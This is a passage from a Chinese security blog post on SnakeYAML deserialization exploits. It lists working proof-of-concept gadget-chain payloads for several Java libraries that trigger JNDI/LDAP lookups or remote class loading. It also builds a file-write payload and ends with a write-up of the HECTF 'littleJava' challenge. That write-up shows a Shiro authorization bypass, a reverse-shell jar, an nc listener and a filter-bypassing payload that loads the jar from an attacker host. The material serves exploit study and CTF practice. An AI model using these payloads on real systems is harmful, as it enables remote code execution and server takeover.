        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">FileContent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token class-name">FileLength</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">{<!-- --></span>
            <span class="token class-name">FileInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
            in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token class-name">FileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> compressbytes <span class="token operator">=</span> <span class="token function">compress</span><span class="token punctuation">(</span><span class="token class-name">FileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> base64str <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>compressbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> poc <span class="token operator">=</span> <span class="token string">"!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\""</span><span class="token operator">+</span><span class="token class-name">Destpath</span><span class="token operator">+</span><span class="token string">"\"],false],!!java.util.zip.Inflater  { input: !!binary "</span><span class="token operator">+</span>base64str<span class="token operator">+</span><span class="token string">" },1048576]]"</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> poc<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">compress</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token class-name">Deflater</span> compresser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Deflater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        compresser<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        compresser<span class="token punctuation">.</span><span class="token function">setInput</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        compresser<span class="token punctuation">.</span><span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>compresser<span class="token punctuation">.</span><span class="token function">finished</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">int</span> i <span class="token operator">=</span> compresser<span class="token punctuation">.</span><span class="token function">deflate</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
                bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            output <span class="token operator">=</span> bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            output <span class="token operator">=</span> data<span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
                bos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        compresser<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> output<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h2><a id="_644"></a>其它利用方式</h2> 
<h3><a id="JdbcRowSetImpl_646"></a>JdbcRowSetImpl</h3> 
<p>跟fastjson调用链一样</p> 
<p>payload:</p> 
<pre><code class="prism language-java"><span class="token string">"!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://localhost:9999/Exec\"\n autoCommit: true"</span><span class="token punctuation">;</span>
</code></pre> 
<p>POC:</p> 
<pre><code class="prism language-JAVA">public class SnakeYaml {
    public static void main(String[] args) {
        String payload = "!!com.sun.rowset.JdbcRowSetImpl\n " +
                "dataSourceName: \"ldap://localhost:9999/Exec\"\n " +
                "autoCommit: true";

        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
</code></pre> 
<h3><a id="Spring_PropertyPathFactoryBean_671"></a>Spring PropertyPathFactoryBean</h3> 
<p>需要有spring依赖</p> 
<pre><code class="prism language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>springframework<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>spring<span class="token operator">-</span>beans<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">5.3</span><span class="token number">.23</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
<span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>springframework<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>spring<span class="token operator">-</span>context<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">5.3</span><span class="token number">.23</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
</code></pre> 
<p>POC:</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Error</span> <span class="token punctuation">,</span><span class="token class-name">Exception</span><span class="token punctuation">{<!-- --></span>
    <span class="token class-name">String</span> poc <span class="token operator">=</span> <span class="token string">"!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n"</span> <span class="token operator">+</span>
            <span class="token string">"    targetBeanName: \"ldap://localhost:9999/Exec\"\n"</span> <span class="token operator">+</span>
            <span class="token string">"    propertyPath: Sentiment\n"</span> <span class="token operator">+</span>
            <span class="token string">"    beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n"</span> <span class="token operator">+</span>
            <span class="token string">"        shareableResources: [\"ldap://localhost:9999/Exec\"]"</span><span class="token punctuation">;</span>
    <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h3><a id="Apache_XBean_702"></a>Apache XBean</h3> 
<p><strong>依赖</strong></p> 
<pre><code class="prism language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xbean<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>xbean<span class="token operator">-</span>naming<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">4.22</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
</code></pre> 
<p>POC:</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Error</span> <span class="token punctuation">,</span><span class="token class-name">Exception</span><span class="token punctuation">{<!-- --></span>
    <span class="token class-name">String</span> poc <span class="token operator">=</span> <span class="token string">"!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\"foo\",!!javax.naming.Reference [foo, \"Exec\", \"http://localhost:7777/\"],!!org.apache.xbean.naming.context.WritableContext []]]"</span><span class="token punctuation">;</span>
    <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h4><a id="Apache_Commons_Configuration_724"></a>Apache Commons Configuration</h4> 
<p><strong>依赖</strong></p> 
<pre><code class="prism language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>commons<span class="token operator">-</span>configuration<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>commons<span class="token operator">-</span>configuration<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.10</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
</code></pre> 
<p>POC：</p> 
<pre><code>public static void main(String[] args) throws Error ,Exception{
    String poc = "\n" +
            "    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \"ldap://localhost:9999/Execs\"]]";
    Yaml yaml = new Yaml();
    yaml.load(poc);
}
</code></pre> 
<h3><a id="C3P0_JndiRefForwardingDataSource_747"></a>C3P0 JndiRefForwardingDataSource</h3> 
<p>POC：</p> 
<pre><code class="prism language-java">    <span class="token class-name">String</span> poc <span class="token operator">=</span> <span class="token string">"!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n"</span> <span class="token operator">+</span>
            <span class="token string">"  jndiName: \"ldap://localhost:9999/Exec\"\n"</span> <span class="token operator">+</span>
            <span class="token string">"  loginTimeout: 0"</span><span class="token punctuation">;</span>
    <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h3><a id="Resource_760"></a>Resource</h3> 
<p><strong>依赖</strong></p> 
<pre><code class="prism language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>jetty<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>jetty<span class="token operator">-</span>jndi<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">9.4</span><span class="token number">.8</span><span class="token punctuation">.</span>v20171121<span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
<span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>jetty<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>jetty<span class="token operator">-</span>plus<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">9.4</span><span class="token number">.8</span><span class="token punctuation">.</span>v20171121<span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
<span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>jetty<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>jetty<span class="token operator">-</span>util<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">9.4</span><span class="token number">.8</span><span class="token punctuation">.</span>v20171121<span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>
</code></pre> 
<p>POC：</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Error</span> <span class="token punctuation">,</span><span class="token class-name">Exception</span><span class="token punctuation">{<!-- --></span>
    <span class="token class-name">String</span> poc <span class="token operator">=</span> <span class="token string">"[!!org.eclipse.jetty.plus.jndi.Resource [\"__/obj\", !!javax.naming.Reference [\"foo\", \"Exec\", \"http://localhost:7777/\"]], !!org.eclipse.jetty.plus.jndi.Resource [\"obj/test\", !!java.lang.Object []]]\n"</span><span class="token punctuation">;</span>
    <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h2><a id="_792"></a>例题</h2> 
<p>正好在HECTF中遇到了一道。</p> 
<h3><a id="littleJava_796"></a>littleJava</h3> 
<h4><a id="shiro_798"></a>shiro权限绕过</h4> 
<p>题目中添加了添加authc拦截器，/admin/*的请求会被拦截，但存在绕过如/admin/*/后边加个斜杠"\"，即可绕过，所以访问/admin/hello/即可<br> <img src="https://images2.imgbox.com/6e/cd/Kj7ZPc4g_o.png" alt="image-20221112001448545.png"></p> 
<h4><a id="snakeYaml_804"></a>snakeYaml反序列化</h4> 
<p>请求/admin/hello/后就能通过data进行yaml反序列化</p> 
<pre><code class="prism language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string">"/admin/hello"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ResponseBody</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"data"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> data<span class="token punctuation">,</span> <span class="token class-name">Model</span> model<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"!!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token string">"Good Yaml"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"Give me one data!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>可以直接用<a href="https://github.com/artsploit/yaml-payload">现成项目</a>，构造反弹shell命令</p> 
<p><img src="https://images2.imgbox.com/51/91/cXMRiHtn_o.png" alt="image-20221112001437569.png"></p> 
<p>生成对应jar包</p> 
<pre><code class="prism language-shell">javac src/artsploit/AwesomeScriptEngineFactory.java
jar <span class="token parameter variable">-cvf</span> yaml-payload.jar <span class="token parameter variable">-C</span> src/ <span class="token builtin class-name">.</span>
</code></pre> 
<p>将生成的yaml-payload.jar，放到vps上，并监听反弹shell端口</p> 
<pre><code class="prism language-shell"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">10000</span>
</code></pre> 
<p>最后是构造反序列化，由于上边过滤了!!，因此需要bypass</p> 
<pre><code class="prism language-shell"><span class="token operator">!</span><span class="token operator">&lt;</span>tag:yaml.org,2002:javax.script.ScriptEngineManager<span class="token operator">&gt;</span> 
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">&lt;</span>tag:yaml.org,2002:java.net.URLClassLoader<span class="token operator">&gt;</span>
<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">&lt;</span>tag:yaml.org,2002:java.net.URL<span class="token operator">&gt;</span> 
<span class="token punctuation">[</span><span class="token string">"http://ip/yaml-payload.jar"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
</code></pre> 
<p>成功反弹shell<br> <img src="https://images2.imgbox.com/f1/c9/tDpEXELb_o.png" alt="image-20221112001718929.png"></p> 
<h2><a id="_855"></a>参考文章</h2> 
<p><a href="https://blog.csdn.net/m0_71777195/article/details/127298311">(2条消息) Java 中经常被提到的 SPI 到底是什么？_肥肥技术宅的博客-CSDN博客</a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/1f80743af6ca2b44d6df4d7a519a3cf8/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Docker工作流</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ea50cb28489e20e7529f8c5031caf0e1/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">PDF转OFD ~java实现</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>